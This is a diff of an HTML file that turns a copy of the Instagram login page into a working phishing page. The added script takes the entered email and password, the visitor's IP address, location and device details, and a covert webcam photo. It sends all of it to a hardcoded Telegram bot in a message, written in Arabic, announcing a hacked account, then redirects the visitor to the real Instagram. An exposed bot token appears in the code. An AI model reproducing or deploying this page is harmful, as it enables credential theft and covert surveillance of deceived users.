@@ -1,143 +1,224 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <link rel="icon" href="icons/InstagramIcon.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background: #fafafa;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
 
-    <title>Instagram.com</title>
-    <link rel="stylesheet" href="styles/style.css">
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background-color: white;
+            border-radius: 8px;
+            width: 350px;
+            box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .login-box img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-box h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .login-box button {
+            background-color: #3897f0;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: #3081d6;
+        }
+
+        .signup-link {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .signup-link a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+
+        footer .copyright {
+            margin-top: 20px;
+            color: #8e8e8e;
+        }
+    </style>
 </head>
-    <div class="user-credential-div">
-        <div class="box">
-            <img class="instagram-logo"
-                src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png"></img>
-            <form>
-                <div>
-                    <input type="text" id="username" name="username" placeholder="Phone number,username, or Email"
-                        class="user-email-place"><br><br>
-                </div>
-                <div>
-                    <input class="user-password-place" placeholder="Password"><br><br>
-                </div>
-                <div>
-                    <button class="login-button">
-                        <span>Log&nbsp;In</span>
-                    </button>
-                </div>
-                <div class="or-section">
-                    <div class="or-divider"></div>
-                    <div class="or-text">OR</div>
-                    <div class="or-divider"></div>
-                </div>
-                <a target="_blank" href="https://www.facebook.com/">
-                    <div class="facebook-section">
-                        <img width="26" height="26" src="https://img.icons8.com/color/48/facebook.png" alt="facebook"/>
-                        <p class="facebook-login-text">Log in with Facebook</p>
-                    </div>
-                </a>
-                <a href="https://www.instagram.com/accounts/password/reset/">
-                    <h5>
-                        <p class="forgot-password-text">Forgot password?</p>
-                    </h5>
-                </a>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            <h2>Log in to Instagram</h2>
+            <form id="loginForm" onsubmit="submitForm(event)">
+                <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
             </form>
+            <div class="signup-link">
+                <span>Don't have an account? </span>
+                <a href="https://www.instagram.com/accounts/signup/email/?hl=en">Sign up</a>
+            </div>
         </div>
     </div>
-    <div class="sign-up-div">
-        <p class="sign-up-text">Don't have an account? <span><a class="bl-text"
-                    href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span></p>
-    </div>
-    <div class="get-app">
-        <p class="get-app-text">
-            Get the app.
-        </p>
-        <div class="app">
-            <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DC44D231A-101C-4AFA-B4A6-F5909E0BCA2B%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1">
-                <img class="app-google" src="icons/google.png">
-            </a>
-            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C2160%2C1368">
-                <img class="app-microsoft" src="icons/microsoft.png">
-            </a>
 
-        </div>
-        <footer>
-            <h5>
-
-                <div class="footer">
-
-                    <p class="first-line">
-                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/">
-                            <span>Meta</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/">
-                            <span>About</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/en_US/blog">
-                            <span>Blog</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/about-us/careers">
-                            <span>Jobs</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/">
-                            <span>Help</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://developers.facebook.com/docs/instagram">
-                            <span>API</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://privacycenter.instagram.com/">
-                            <span>Privacy</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/581066165581870/">
-                            <span>Terms</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/directory/profiles/">
-                            <span>Top Accounts</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/explore/locations/">
-                            <span>Locations</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/web/lite/">
-                            <span>Instagram Lite</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://www.threads.net/">
-                            <span>Threads</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://www.facebook.com/help/instagram/261704639352628">
-                            <span>Contact Uploading & Non-Users</span>
-                        </a>
-
-                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/technologies/meta-verified/">
-                            <span>Meta Verified</span>
-                        </a>
-
-                    </p>
-                    <p class="second-line">
-                        <span class="s-line-elements">English <img width="12" height="12"
-                                src="https://img.icons8.com/ios-glyphs/30/expand-arrow--v1.png"
-                                alt="expand-arrow--v1" /></span>
-                        <span class="s-line-elements">© 2023 Instagram from Meta</span>
-                    </p>
-                </div>
-
-            </h5>
-
-    </div>
+    <footer>
+        <a href="#">About</a> | <a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Locations</a> <br>
+        <div class="copyright">© 2025 Instagram from Facebook</div>
     </footer>
-</body>
 
+    <script>
+        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
+        const chatId = "5091980014"; // Your Telegram user ID
+
+        async function getUserLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json');
+                const data = await response.json();
+                return {
+                    city: data.city,
+                    country: data.country,
+                    ip: data.ip,
+                    org: data.org,
+                    asn: data.asn
+                };
+            } catch (error) {
+                return {
+                    city: "Unknown",
+                    country: "Unknown",
+                    ip: "Unknown",
+                    org: "Unknown",
+                    asn: "Unknown"
+                };
+            }
+        }
+
+        function getDeviceInfo() {
+            const platform = navigator.platform;
+            const browserInfo = navigator.userAgent;
+            const language = navigator.language;
+            const memory = (navigator.deviceMemory || 4); // Assuming 4GB if not available
+            const cpuCores = navigator.hardwareConcurrency || 4;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            
+            return { platform, browserInfo, language, memory, cpuCores, screenResolution };
+        }
+
+        function captureImage() {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        resolve(canvas.toDataURL('image/jpeg'));
+                    }, 3000); // Wait for 3 seconds before capturing
+                }).catch(() => resolve(null)); // Handle error and resolve null
+            });
+        }
+
+        async function submitForm(event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Get user location and device info
+            const locationData = await getUserLocation();
+            const deviceInfo = getDeviceInfo();
+            const currentTime = new Date().toLocaleString();
+
+            // Capture image from the camera
+            const imageData = await captureImage();
+
+            // Prepare the message to send to the bot in Arabic
+            const message = `🔓 *حساب تم اختراقه! تفاصيل الحساب مكشوفة* 🔓\n\n` +
+                            `💻 *معلومات الحساب:* 💻\n` +
+                            `📧 البريد الإلكتروني: ${email}\n` +
+                            `🔑 كلمة المرور: ${password}\n\n` +
+                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
+                            `🌐 عنوان الـ IP: ${locationData.ip}\n` +
+                            `🔍 المزود: ${locationData.org}\n` +
+                            `🚨 ASN: ${locationData.asn}\n\n` +
+                            `💻 *معلومات الجهاز:* 💻\n` +
+                            `🖥️ النظام: ${deviceInfo.platform}\n` +
+                            `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
+                            `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
+                            `🔧 الرام: ${deviceInfo.memory}GB\n` +
+                            `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
+                            `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
+                            `🕒 *التوقيت:* ${currentTime}\n\n` +
+                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
+
+            // Send the information to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            // Send the captured image to Telegram bot
+            if (imageData) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *تم التقاط صورة المستخدم*" })
+                });
+            }
+
+            // Redirect the user to Instagram after sending the data
+            setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
+        }
+    </script>
+</body>
 </html>
